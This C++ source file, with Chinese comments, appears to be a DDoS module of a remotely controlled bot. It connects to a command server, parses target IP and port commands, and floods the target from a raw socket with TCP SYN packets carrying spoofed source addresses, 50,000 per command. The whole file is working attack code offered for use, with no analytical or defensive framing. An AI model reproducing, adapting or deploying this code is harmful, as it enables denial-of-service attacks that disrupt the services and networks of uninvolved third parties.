#include "ddosspy.h"
#define SEQ 0x28376839

// 互挤体，用来确保线程安全
static CRITICAL_SECTION gds;
// 初始化类
static DdosSpy dSpy;

//定义一个tcphdr结构来存放TCP首部
typedef struct tcphdr
{
    USHORT th_sport;//16位源端口号
    USHORT th_dport;//16位目的端口号
    unsigned int th_seq;//32位序列号
    unsigned int th_ack;//32位确认号
    unsigned char th_lenres;//4位首部长度+6位保留字中的4位
    unsigned char th_flag;//6位保留字中的2位+6位标志位
    USHORT th_win;//16位窗口大小
    USHORT th_sum;//16位效验和
    USHORT th_urp;//16位紧急数据偏移量
}TCP_HEADER;


//定义一个iphdr来存放IP首部
typedef struct iphdr//ip首部
{
        unsigned char h_verlen;//4位IP版本号+和4位首部长度
        unsigned char tos;//8位服务类型
        unsigned short total_len;//16位总长度
        unsigned short ident;//16位标志
        unsigned short frag_and_flags;//3位标志位（如SYN,ACK,等等)+片偏移量
        unsigned char ttl;//8位生存时间
        unsigned char proto;//8位协议
        unsigned short checksum;//ip首部效验和
        unsigned int sourceIP;//伪造IP地址
        unsigned int destIP;//攻击的ip地址
}IP_HEADER;


//TCP伪首部，用于进行TCP效验和的计算，保证TCP效验的有效性
struct
{
    unsigned long saddr;//源地址
    unsigned long daddr;//目的地址
    char mbz;//置空
    char ptcl;//协议类型
    unsigned short tcpl;//TCP长度
}PSD_HEADER;


DdosSpy::DdosSpy()
{
    // 初始化互挤体
    InitializeCriticalSection(&gds);
    srand((unsigned)time(NULL));
}

DdosSpy::~DdosSpy()
{
    // 删除互挤体
    DeleteCriticalSection(&gds);
}


//计算效验和函数，先把IP首部的效验和字段设为0(IP_HEADER.checksum=0)
//然后计算整个IP首部的二进制反码的和。
USHORT DdosSpy::checksum(USHORT *buffer, int size)
{
    unsigned long cksum=0;
    while(size >1)
    {
        cksum+=*buffer++;
        size-=sizeof(USHORT);
    }
    if(size) cksum+=*(UCHAR*)buffer;
    cksum=(cksum >> 16)+(cksum&0xffff);
    cksum+=(cksum >>16);
    return (USHORT)(~cksum);
}


void DdosSpy::startByNewThread(std::string domain, int port)
{
    // 将域名和端口数据转换成一个字符指针类型
    char *args = new char[MAX_PATH+sizeof(int)];
    domain.reserve(MAX_PATH);
    memcpy(args,domain.data(), MAX_PATH);
    memcpy(args+MAX_PATH,(char*)&port, sizeof(int));

    // 创建新线程
    HANDLE h = CreateThread(NULL,0, DdosSpy::threadProc,(LPVOID)args,0,NULL);
    if (!h) {
        std::cout << "Failed to create new thread" << std::endl;
        std::fflush(stdout);
    }
}

DWORD DdosSpy::threadProc(LPVOID args)
{
    char domain[MAX_PATH];
    memcpy(domain, args, MAX_PATH);
    int port = *((int*)((char*)args+MAX_PATH));

    // 开始DDOS
    startDdosSpy(domain, port);

    // 释放参数
    delete (char *)args;
    return true;
}

void DdosSpy::startDdosSpy(std::string domain, int port)
{
    // 创建socket并连接至服务端
    TcpSocket sock;
    if (!sock.connectTo(domain, port)) {
        std::cout << "Failed to connect server " <<
                     domain << ":" << port << std::endl;
        std::fflush(stdout);
        return;
    }

    // 开始监控消息
    std::cout << "Started ddos atk" << std::endl;
    std::fflush(stdout);

    // 死循环，不断从服务端接收数据
    const int packetSize = 800;
    char szData[packetSize];
    int ret;
    std::string buf;

    while (1) {
        ret = sock.recvData(szData, packetSize);

        // 出现错误
        if (ret == SOCKET_ERROR || ret == 0) {
            break;
        }

       // 把数据加入到缓冲区
       addDataToBuffer(&sock, buf, szData, ret);
    }

    // 完成
    std::cout << "Finished cmd spy" << std::endl;
    std::fflush(stdout);
}

void DdosSpy::addDataToBuffer(TcpSocket *sock, std::string &buf, char *data, int size)
{
    buf.append(data,size);

    // 把数据转换成指令模式
    int endIndex;
    while ((endIndex = buf.find(dSpy.DdosEnd)) >= 0) {
        std::string line = buf.substr(0,endIndex);
        buf.erase(0, endIndex+dSpy.DdosEnd.length());

        // 处理指令
        std::map<std::string, std::string> ddosargs = dSpy.parseArgs(line);

        execDdos(ddosargs["IP"].data(),atoi(ddosargs["PORT"].data()));
    }
}

std::map<std::string, std::string> DdosSpy::parseArgs(std::string &data)
{
    // 字符串分割成列表
    std::vector<std::string> v;
    std::string::size_type pos1, pos2;
    pos2 = data.find(DdosSplit);
    pos1 = 0;
    while(std::string::npos != pos2) {
        v.push_back(data.substr(pos1, pos2-pos1));
        pos1 = pos2 + DdosSplit.size();
        pos2 = data.find(DdosSplit, pos1);
    }
    if(pos1 != data.length()) v.push_back(data.substr(pos1));

    // 解析参数
    std::map<std::string, std::string> args;
    for (int i=0; i<(int)v.size()-1; i+=2) {
        args[v.at(i)] =  v.at(i+1);
    }

    return args;
}

void DdosSpy::execDdos(std::string atk_ip, int atk_port)
{
    // 锁定函数，其他线程不能进来
    EnterCriticalSection(&gds);

    int port=atk_port;
    const char *DestIP=atk_ip.data();

    /******************/
    SOCKET  sock =(SOCKET)NULL;
    int flag=true,TimeOut=2000,FakeIpNet,FakeIpHost,dataSize=0,SendSEQ=0;
    struct sockaddr_in sockAddr;
    TCP_HEADER  tcpheader;
    IP_HEADER   ipheader;
    char        sendBuf[128]={0};
    sock=WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED);
    //设置IP_HDRINCL以便自己填充IP首部
    setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&flag,sizeof(int));
    //设置发送超时
    setsockopt(sock,SOL_SOCKET,SO_SNDTIMEO,(char*)&TimeOut,sizeof(TimeOut));
    //设置目标地址
    memset(&sockAddr,0,sizeof(sockAddr));  //清0
    sockAddr.sin_family=AF_INET;
    sockAddr.sin_addr.s_addr =inet_addr(DestIP);
    FakeIpNet=inet_addr(DestIP);
    FakeIpHost=ntohl(FakeIpNet);         //潜在的问题，客户端伪造的源ip一样
    //填充IP首部
    ipheader.h_verlen=(4<<4 | sizeof(IP_HEADER)/sizeof(unsigned long));
    ipheader.total_len = htons(sizeof(IP_HEADER)+sizeof(TCP_HEADER));
    ipheader.ident = 1;
    ipheader.frag_and_flags = 0;
    ipheader.ttl = 128;
    ipheader.proto = IPPROTO_TCP;
    ipheader.checksum =0;
    ipheader.sourceIP = htonl(FakeIpHost+SendSEQ);
    ipheader.destIP = inet_addr(DestIP);
    //填充TCP首部
    tcpheader.th_dport=htons(port);  //目的端口
    tcpheader.th_sport = htons(rand()%1025);   //源端口
    tcpheader.th_seq = htonl(SEQ+SendSEQ);
    tcpheader.th_ack = 0;
    tcpheader.th_lenres =(sizeof(TCP_HEADER)/4<<4|0);
    tcpheader.th_flag = 2;
    tcpheader.th_win = htons(16384);
    tcpheader.th_urp = 0;
    tcpheader.th_sum = 0;
    PSD_HEADER.saddr=ipheader.sourceIP;
    PSD_HEADER.daddr=ipheader.destIP;
    PSD_HEADER.mbz=0;
    PSD_HEADER.ptcl=IPPROTO_TCP;
    PSD_HEADER.tcpl=htons(sizeof(tcpheader));
    for(;SendSEQ<50000;)
    {
        SendSEQ=(SendSEQ==65536)?1:SendSEQ+1;
        ipheader.checksum =0;
        ipheader.sourceIP = htonl(FakeIpHost+SendSEQ);
        tcpheader.th_seq = htonl(SEQ+SendSEQ);
        tcpheader.th_sport = htons(SendSEQ);
        tcpheader.th_sum = 0;
        PSD_HEADER.saddr=ipheader.sourceIP;
        //把TCP伪首部和TCP首部复制到同一缓冲区并计算TCP效验和
        memcpy(sendBuf,&PSD_HEADER,sizeof(PSD_HEADER));
        memcpy(sendBuf+sizeof(PSD_HEADER),&tcpheader,sizeof(tcpheader));
        tcpheader.th_sum=checksum((USHORT *)sendBuf,sizeof(PSD_HEADER)+sizeof(tcpheader));
        memcpy(sendBuf,&ipheader,sizeof(ipheader));
        memcpy(sendBuf+sizeof(ipheader),&tcpheader,sizeof(tcpheader));
        memset(sendBuf+sizeof(ipheader)+sizeof(tcpheader),0,4);
        dataSize=sizeof(ipheader)+sizeof(tcpheader);
        ipheader.checksum=checksum((USHORT *)sendBuf,dataSize);
        memcpy(sendBuf,&ipheader,sizeof(ipheader));
        sendto(sock,sendBuf,dataSize,0,(struct sockaddr*) &sockAddr,sizeof(sockAddr));
    }
    /******************/
    WSACleanup();
    // 解除函数锁定
    LeaveCriticalSection(&gds);

}
